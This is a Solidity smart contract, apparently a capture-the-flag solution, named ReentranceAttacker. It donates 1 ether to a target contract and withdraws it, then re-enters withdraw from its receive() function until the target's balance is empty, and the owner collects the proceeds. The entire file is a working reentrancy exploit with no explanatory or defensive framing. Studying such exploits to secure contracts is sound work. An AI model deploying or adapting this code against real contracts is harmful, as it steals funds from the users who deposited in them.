// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface targetInterface {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract ReentranceAttacker {
    targetInterface target;
    address owner;

    constructor(address targetAdress) {
        owner = msg.sender;
        target = targetInterface(targetAdress);
    }

    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function attack() public payable {
        target.donate{value: 1 ether}(address(this));
        target.withdraw(1 ether);
    }

    function min(uint a, uint b) private pure returns (uint) {
        return a <= b ? a : b;
    }

    receive() external payable {
        uint value = min(1 ether, address(target).balance);

        if (value > 0) {
            target.withdraw(value);
        }
    }
}
